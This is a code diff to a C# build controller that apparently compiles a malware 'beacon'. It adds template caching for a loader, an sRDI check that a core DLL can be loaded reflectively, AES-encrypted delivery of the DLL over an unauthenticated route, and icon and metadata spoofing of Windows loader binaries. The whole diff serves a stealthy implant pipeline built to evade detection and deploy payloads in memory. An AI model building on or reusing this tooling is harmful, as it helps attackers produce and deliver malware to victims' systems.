@@ -16,6 +16,7 @@ public class BuilderController : ControllerBase
 {
     private static readonly string OutputBase = Path.GetFullPath(Path.Combine(AppContext.BaseDirectory, "..", "..", "..", "..", "build-output"));
     private static readonly string HistoryFile = Path.Combine(OutputBase, "builds.json");
+    private static readonly string TemplateDir = Path.Combine(OutputBase, "loader-template");
 
     private static readonly string RustAgentDir = Path.GetFullPath(Path.Combine(AppContext.BaseDirectory, "..", "..", "..", "..", "agent-rs"));
 
@@ -252,6 +253,42 @@ public class BuilderController : ControllerBase
         return Ok(new { status = "ok" });
     }
 
+    // ── Template management ─────────────────────────────────────────────
+
+    [HttpDelete("template")]
+    public IActionResult ClearTemplate()
+    {
+        try
+        {
+            if (Directory.Exists(TemplateDir))
+                Directory.Delete(TemplateDir, true);
+            return Ok(new { status = "ok", message = "Loader template cleared. Next build will recompile." });
+        }
+        catch (Exception ex)
+        {
+            return StatusCode(500, new { error = ex.Message });
+        }
+    }
+
+    [HttpGet("template")]
+    public IActionResult TemplateStatus()
+    {
+        var platforms = Directory.Exists(TemplateDir)
+            ? Directory.GetDirectories(TemplateDir).Select(d => new
+            {
+                platform = Path.GetFileName(d),
+                files = Directory.GetFiles(d).Select(f => new
+                {
+                    name = Path.GetFileName(f),
+                    size = new FileInfo(f).Length,
+                    modified = System.IO.File.GetLastWriteTimeUtc(f).ToString("o"),
+                })
+            }).ToArray()
+            : Array.Empty<object>();
+
+        return Ok(new { templateDir = TemplateDir, platforms });
+    }
+
     // ── Core DLL delivery (no auth — DLL is AES-encrypted) ─────────────
 
     [HttpGet("/api/beacon/core/{buildId}")]
@@ -352,6 +389,20 @@ public class BuilderController : ControllerBase
             job.Log($"Core DLL found: {coreDllPath} ({coreDllBytes.Length / 1024} KB)");
 
             // ══════════════════════════════════════════════════════════════
+            // Stage 1.5: Validate Core DLL via sRDI tool
+            // ══════════════════════════════════════════════════════════════
+            job.Log("=== Stage 1.5: Validating Core DLL for reflective loading ===");
+            var srdiArgs = $"run --release -p srdi --target-dir \"{targetDir}\" -- \"{coreDllPath}\" core_main";
+            var srdiResult = await RunProcessAsync("cargo", srdiArgs, job, RustAgentDir, envVars);
+            if (srdiResult.ExitCode != 0)
+            {
+                job.Fail($"Core DLL validation failed — 'core_main' export not found or DLL is invalid");
+                UpdateHistory(job);
+                return;
+            }
+            job.Log("Core DLL validated: PE structure OK, 'core_main' export present");
+
+            // ══════════════════════════════════════════════════════════════
             // Stage 2: Encrypt Core DLL
             // ══════════════════════════════════════════════════════════════
             job.Log("=== Stage 2: Encrypting Core DLL ===");
@@ -389,37 +440,61 @@ public class BuilderController : ControllerBase
             job.Log("AES key generated, RSA keypair created, AES key encrypted");
 
             // ══════════════════════════════════════════════════════════════
-            // Stage 3: Build Loader
+            // Stage 3: Get Loader (from template or build fresh)
             // ══════════════════════════════════════════════════════════════
-            job.Log("=== Stage 3: Building Loader ===");
-            var loaderBuildArgs = $"build --release {targetArg} -p loader --target-dir \"{targetDir}\"";
-            job.Log($"cargo {loaderBuildArgs}");
-
-            var loaderBuildResult = await RunProcessAsync("cargo", loaderBuildArgs, job, RustAgentDir, envVars);
-            if (loaderBuildResult.ExitCode != 0)
-            {
-                job.Fail($"Loader build failed (exit code {loaderBuildResult.ExitCode})");
-                UpdateHistory(job);
-                return;
-            }
+            job.Log("=== Stage 3: Preparing Loader ===");
 
             var loaderExeName = isWindows ? "loader.exe" : "loader";
-            var exePath = Path.Combine(releaseDir, loaderExeName);
-            if (!System.IO.File.Exists(exePath))
+            var templatePlatformDir = Path.Combine(TemplateDir, req.Platform);
+            var templatePath = Path.Combine(templatePlatformDir, loaderExeName);
+            var exePath = Path.Combine(tempDir, loaderExeName);
+
+            if (System.IO.File.Exists(templatePath))
             {
-                var found = Directory.GetFiles(releaseDir, "*")
-                    .FirstOrDefault(f => Path.GetFileName(f) == "loader" || Path.GetFileName(f) == "loader.exe");
-                if (found != null) exePath = found;
+                // ── Use cached template ──
+                job.Log($"Using cached loader template: {templatePath}");
+                System.IO.File.Copy(templatePath, exePath, true);
+            }
+            else
+            {
+                // ── First time: compile loader and save as template ──
+                job.Log("No template found, compiling loader from source...");
+                var loaderBuildArgs = $"build --release {targetArg} -p loader --target-dir \"{targetDir}\"";
+                job.Log($"cargo {loaderBuildArgs}");
+
+                var loaderBuildResult = await RunProcessAsync("cargo", loaderBuildArgs, job, RustAgentDir, envVars);
+                if (loaderBuildResult.ExitCode != 0)
+                {
+                    job.Fail($"Loader build failed (exit code {loaderBuildResult.ExitCode})");
+                    UpdateHistory(job);
+                    return;
+                }
+
+                var compiledLoader = Path.Combine(releaseDir, loaderExeName);
+                if (!System.IO.File.Exists(compiledLoader))
+                {
+                    var found = Directory.GetFiles(releaseDir, "*")
+                        .FirstOrDefault(f => Path.GetFileName(f) == "loader" || Path.GetFileName(f) == "loader.exe");
+                    if (found != null) compiledLoader = found;
+                }
+
+                if (!System.IO.File.Exists(compiledLoader))
+                {
+                    job.Fail($"Loader binary not found at {releaseDir}");
+                    UpdateHistory(job);
+                    return;
+                }
+
+                // Save as template for future builds
+                Directory.CreateDirectory(templatePlatformDir);
+                System.IO.File.Copy(compiledLoader, templatePath, true);
+                job.Log($"Loader template saved: {templatePath}");
+
+                // Copy to build directory
+                System.IO.File.Copy(compiledLoader, exePath, true);
             }
 
-            if (!System.IO.File.Exists(exePath))
-            {
-                job.Fail($"Loader binary not found at {releaseDir}");
-                UpdateHistory(job);
-                return;
-            }
-
-            job.Log($"Loader binary found: {exePath} ({new FileInfo(exePath).Length / 1024} KB)");
+            job.Log($"Loader ready: {new FileInfo(exePath).Length / 1024} KB");
 
             // ── Icon & metadata embedding via rcedit (Windows PE only) ──
             if (isWindows && HasIconOrMetadata(req))
